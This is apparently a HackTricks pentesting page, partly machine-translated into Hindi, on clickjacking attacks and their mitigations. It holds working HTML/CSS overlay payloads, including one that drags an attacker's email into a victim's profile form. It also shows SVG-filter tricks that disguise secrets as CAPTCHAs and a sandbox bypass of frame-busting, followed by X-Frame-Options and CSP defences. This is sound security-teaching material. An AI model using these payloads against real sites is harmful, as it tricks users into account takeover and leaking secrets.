# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking क्या है

एक clickjacking हमले में, एक **उपयोगकर्ता** को **धोखा दिया जाता है** कि वह किसी वेबपेज पर किसी ऐसे **एलीमेंट** पर **क्लिक करने** के लिए जो या तो **अदृश्य** हो या किसी दूसरे एलीमेंट के रूप में छिपा हुआ हो। इस मैनिपुलेशन के कारण उपयोगकर्ता के लिए अनपेक्षित परिणाम हो सकते हैं, जैसे कि malware का डाउनलोड होना, दुर्भावनापूर्ण वेब पेजों पर redirect होना, credentials या संवेदनशील जानकारी प्रदान करना, पैसे का transfer होना, या ऑनलाइन उत्पादों की खरीदारी।

### Prepopulate forms trick

कभी-कभी पेज लोड करते समय **GET parameters का उपयोग करके किसी फॉर्म के फील्ड्स के मान भरना** संभव होता है। एक हमलावर इस व्यवहार का दुरुपयोग करके किसी फॉर्म को मनमाना डेटा भरने और clickjacking payload भेजने के लिए कर सकता है ताकि उपयोगकर्ता Submit बटन दबा दे।

### Populate form with Drag\&Drop

यदि आप चाहते हैं कि उपयोगकर्ता **फॉर्म भरें** पर आप सीधे उससे कुछ विशिष्ट जानकारी (जैसे ईमेल या वह specific password जो आप जानते हैं) लिखने के लिए निर्देश नहीं देना चाहते, तो आप बस उसे किसी चीज़ को **Drag\&Drop** करने के लिए कह सकते हैं जो आपकी नियंत्रित जानकारी भर देगा, जैसे [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### कई-चरण Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

यदि आपने किसी ऐसे **XSS attack that requires a user to click** की पहचान की है जो XSS को **trigger** करने के लिए उपयोगकर्ता को किसी तत्व पर क्लिक करने की आवश्यकता रखता है और पृष्ठ **vulnerable to clickjacking** है, तो आप इसे दुरुपयोग करके user को बटन/लिंक पर क्लिक करने के लिए trick कर सकते हैं.\
Example:\
आपने खाते के कुछ निजी विवरणों में एक **self XSS** पाया (ऐसे विवरण जो **only you can set and read**). उन विवरणों को सेट करने वाले पेज का **form** जो इन्हें सेट करता है, **vulnerable** है **Clickjacking** के लिए और आप GET parameters का उपयोग करके **form** को **prepopulate** कर सकते हैं.\
एक attacker उस पेज के लिए **Clickjacking** attack तैयार कर सकता है जो **form** को **XSS payload** से **prepopulating** करे और **user** को फॉर्म **Submit** करने के लिए **trick** करे. इसलिए, **when the form is submitted** और मान बदल दिए जाने पर, **user will execute the XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), यह technique victim से अनुरोध करती है कि वह किसी custom page के एक button पर double click करे जो एक specific location पर रखा गया हो, और mousedown और onclick events के timing differences का उपयोग कर के double click के दौरान victim page को load कर दिया जाता है ताकि **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> यह technique user को victim page के एक ही स्थान पर क्लिक करने के लिए trick करने के द्वारा clickjacking के खिलाफ सभी protections को bypass कर देती है. इसलिए attacker को ऐसे **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions** खोजने होंगे.

### SVG Filters / Cross-Origin Iframe UI Redressing

Modern Chromium/WebKit/Gecko builds CSS `filter:url(#id)` को cross-origin iframes पर apply होने की अनुमति देते हैं. iframe के rasterized pixels को SVG filter graph में `SourceGraphic` के रूप में expose किया जाता है, इसलिए primitives जैसे `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, आदि arbitrary तरीके से victim UI को user के देखने से पहले warp कर सकते हैं, हालांकि attacker कभी DOM को छूता नहीं. A simple Liquid-Glass style filter looks like:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* उपयोगी प्रिमिटिव्स: `feImage` attacker bitmaps लोड करता है (उदा., overlays, displacement maps); `feFlood` स्थिर-रंग मैट्स बनाता है; `feOffset/feGaussianBlur` highlights को निखारते हैं; `feDisplacementMap` टेक्स्ट को refract/warp करता है; `feComposite operator="arithmetic"` प्रति-चैनल arbitrary गणिति लागू करता है (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), जो contrast boosting, masking, और AND/OR operations के लिए पर्याप्त है; `feTile` pixel probes को crop और replicate करता है; `feMorphology` strokes को बढ़ाता/सिकोड़ता है; `feColorMatrix` luma को alpha में ले जाकर precise masks बनाता है।

#### गुप्त जानकारियों को CAPTCHA-style prompts में विकृत करना

यदि कोई framable endpoint secrets (tokens, reset codes, API keys) रेंडर करता है, तो attacker उन्हें इस तरह विकृत कर सकता है कि वे एक CAPTCHA जैसा दिखें और मैनुअल ट्रांसक्रिप्शन के लिए मजबूर करें:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
विकृत पिक्सल उपयोगकर्ता को यह धोखा देते हैं कि वह हमलावर-नियंत्रित `<input>` के अंदर captcha “solve” कर रहा है, जबकि उस `pattern` वास्तविक पीड़ित का secret लागू करता है।

#### पीड़ित इनपुट्स का पुनःसंदर्भ

Filters प्लेसहोल्डर/validation टेक्स्ट को सर्जिकल तरीके से हटा सकते हैं जबकि user keystrokes को बरकरार रखते हैं। एक workflow:

1. `feComposite operator="arithmetic" k2≈4` ब्राइटनेस को amplify करता है ताकि ग्रे helper text सफेद में saturate हो जाए।
2. `feTile` कार्यक्षेत्र को input rectangle तक सीमित करता है।
3. `feMorphology operator="erode"` पीड़ित द्वारा टाइप किए गए गहरे glyphs को मोटा करता है और उन्हें `result="thick"` में स्टोर करता है।
4. `feFlood` एक सफेद plate बनाता है, `feBlend mode="difference"` `thick` के साथ करता है, और एक दूसरा `feComposite k2≈100` इसे एक ज्वलंत luma matte में बदल देता है।
5. `feColorMatrix` उस luma को alpha में ले जाता है, और `feComposite in="SourceGraphic" operator="in"` केवल user-entered glyphs को रखता है।
6. एक और `feBlend in2="white"` और एक पतला crop एक साफ textbox देता है, जिसके बाद हमलावर अपने HTML लेबल्स (उदा., “Enter your email”) ओवरले कर देता है, जबकि hidden iframe अभी भी victim origin की password policy लागू करता है।

Safari को `feTile` के साथ दिक्कत होती है; वही प्रभाव spatial mattes से बनाया जा सकता है जो `feFlood` + `feColorMatrix` + `feComposite` से बनते हैं WebKit-only payloads के लिए।

#### पिक्सेल प्रोब्स, लॉजिक और स्टेट मशीनें

`feTile` के साथ 2–4 px क्षेत्र को crop करके और उसे viewport के `100%` पर tile करके, हमलावर sampled color को एक फुल-फ्रेम texture में बदल देता है जिसे threshold करके एक boolean mask में बदला जा सकता है:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
किसी भी रंग के लिए, एक `feFlood` संदर्भ (उदा., `#0B57D0`) के साथ `feBlend mode="difference"` और एक और arithmetic composite (`k2≈100`, `k4` को tolerance के रूप में) केवल उस समय सफेद आउटपुट देता है जब सैंपल किया गया पिक्सेल लक्ष्य शेड से मेल खाता है। इन मास्कों को ट्यून किए गए `k1..k4` के साथ `feComposite` में फीड करने पर लॉजिक गेट बनते हैं: `AND` के लिए `k1=1`, `OR` के लिए `k2=k3=1`, `XOR` के लिए `feBlend mode="difference"`, `NOT` के लिए सफेद के खिलाफ blending। गेट्स को चेन करने पर filter graph के अंदर एक पूर्ण जोड़कर्ता (full adder) बनता है, जो दिखाता है कि pipeline functionally complete है।

इसलिए हमलावर बिना JavaScript के UI स्थिति पढ़ सकते हैं। एक modal workflow से उदाहरण boolean:

- **D** (dialog visible): एक अंधेरे कोने में जांचें और सफेद के खिलाफ परीक्षण करें।
- **L** (dialog loaded): बटन जिन समन्वयों पर तैयार होकर दिखाई देता है, उन समन्वयों की जांच करें।
- **C** (checkbox checked): checkbox पिक्सेल की तुलना active blue `#0B57D0` के साथ करें।
- **R** (red success/failure banner): बैनर आयत के अंदर `feMorphology` और लाल thresholds का उपयोग करें।

प्रत्येक पहचानी गई स्थिति एक अलग overlay bitmap को gate करती है जो `feImage xlink:href="data:..."` के माध्यम से embedded होती है। उन बिटमैप्स को `D`, `L`, `C`, `R` के साथ mask करने से overlays वास्तविक dialog के साथ सिंक्रोनाइज़ रहती हैं और पीड़ित को multi-step workflows (password resets, approvals, destructive confirmations) के माध्यम से बिना कभी DOM को प्रकट किए चला देती हैं।

### Browser extensions: DOM-based autofill clickjacking

victim pages को iframe करने के अलावा, हमलावर पेज में inject किए गए browser extension के UI तत्वों को टार्गेट कर सकते हैं। Password managers focused inputs के पास autofill dropdowns render करते हैं; attacker-controlled field पर focus करके और extension के dropdown को hide/occlude (opacity/overlay/top-layer ट्रिक्स) करके, एक दबाव में लाए गए user click से स्टोर किया गया आइटम select हो सकता है और sensitive data attacker-controlled inputs में भर दी जा सकती है। यह variant किसी iframe exposure की जरूरत नहीं देता और पूरी तरह DOM/CSS manipulation के जरिए काम करता है।

- विशिष्ट तकनीकें और PoCs के लिए देखें:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Clickjacking को कम करने की रणनीतियाँ

### क्लाइंट-साइड बचाव

क्लाइंट-साइड पर execute होने वाले स्क्रिप्ट Clickjacking को रोकने के लिए निम्न क्रियाएँ कर सकते हैं:

- यह सुनिश्चित करना कि application window main या top window हो।
- सभी frames को visible बनाना।
- invisible frames पर clicks रोकना।
- संभावित Clickjacking प्रयासों का पता लगाना और users को alert करना।

हालाँकि, ये frame-busting स्क्रिप्ट्स बायपास की जा सकती हैं:

- **Browsers' Security Settings:** कुछ browsers अपनी security settings या JavaScript समर्थन की कमी के आधार पर इन स्क्रिप्ट्स को ब्लॉक कर सकते हैं।
- **HTML5 iframe `sandbox` Attribute:** एक हमलावर `sandbox` attribute को `allow-forms` या `allow-scripts` मानों के साथ सेट करके frame buster स्क्रिप्ट्स को निष्प्रभाव कर सकता है, बशर्ते कि `allow-top-navigation` न दिया गया हो। इससे iframe यह सत्यापित नहीं कर पाएगा कि वह top window है, उदाहरण के लिए,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` और `allow-scripts` मान iframe के अंदर क्रियाओं को सक्षम करते हैं जबकि टॉप-लेवल नेविगेशन को निष्क्रिय करते हैं। लक्षित साइट की इच्छित कार्यक्षमता सुनिश्चित करने के लिए, attack type के अनुसार अतिरिक्त अनुमतियाँ जैसे `allow-same-origin` और `allow-modals` आवश्यक हो सकती हैं। ब्राउज़र कंसोल संदेश यह मार्गदर्शन कर सकते हैं कि कौन सी अनुमतियाँ दी जानी चाहिए।

### सर्वर-साइड सुरक्षा

#### X-Frame-Options

The **`X-Frame-Options` HTTP response header** ब्राउज़र को यह बताती है कि किसी पेज को `<frame>` या `<iframe>` में रेंडर करना वैध है या नहीं, जिससे Clickjacking को रोकने में मदद मिलती है:

- `X-Frame-Options: deny` - No domain can frame the content.
- `X-Frame-Options: sameorigin` - Only the current site can frame the content.
- `X-Frame-Options: allow-from https://trusted.com` - Only the specified 'uri' can frame the page.
- Note the limitations: if the browser doesn't support this directive, it might not work. Some browsers prefer the CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors directive

**`frame-ancestors` directive in CSP** Clickjacking से सुरक्षा के लिए सुझाया गया तरीका है:

- `frame-ancestors 'none'` - Similar to `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Similar to `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Similar to `X-Frame-Options: allow-from`.

For instance, the following CSP only allows framing from the same domain:

`Content-Security-Policy: frame-ancestors 'self';`

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with `child-src` and `frame-src`

**Content Security Policy (CSP)** एक सुरक्षा उपाय है जो ब्राउज़र को यह निर्दिष्ट करके Clickjacking और अन्य code injection attacks से रोकने में मदद करता है कि किन स्रोतों को सामग्री लोड करने की अनुमति दी जानी चाहिए।

#### `frame-src` Directive

- फ्रेम्स के लिए वैध स्रोत निर्दिष्ट करता है।
- यह `default-src` directive की तुलना में अधिक विशिष्ट है।
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
यह पॉलिसी समान origin (self) और https://trusted-website.com से frames की अनुमति देती है।

#### `child-src` निर्देश

- CSP level 2 में यह web workers और frames के वैध स्रोत सेट करने के लिए पेश किया गया था।
- यह frame-src और worker-src के लिए एक fallback के रूप में काम करता है।
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
यह नीति same origin (self) और https://trusted-website.com से आने वाले frames और workers को अनुमति देती है।

**उपयोग नोट्स:**

- Deprecation: child-src को frame-src और worker-src के पक्ष में चरणबद्ध रूप से हटाया जा रहा है।
- Fallback Behavior: अगर frame-src अनुपस्थित है, तो frames के लिए child-src को fallback के रूप में उपयोग किया जाता है। यदि दोनों अनुपस्थित हैं, तो default-src का उपयोग होता है।
- Strict Source Definition: directives में केवल trusted sources शामिल करें ताकि exploitation से बचाव हो सके।

#### JavaScript Frame-Breaking Scripts

हालाँकि यह पूरी तरह भरोसेमंद नहीं है, JavaScript-based frame-busting scripts का उपयोग किसी वेब पेज को फ्रेम किए जाने से रोकने के लिए किया जा सकता है। उदाहरण:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens का उपयोग

- **Token Validation:** web applications में anti-CSRF tokens का उपयोग करें ताकि state-changing requests उपयोगकर्ता द्वारा जानबूझकर किए गए हों और किसी Clickjacked page के माध्यम से न हों।

## संदर्भ

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
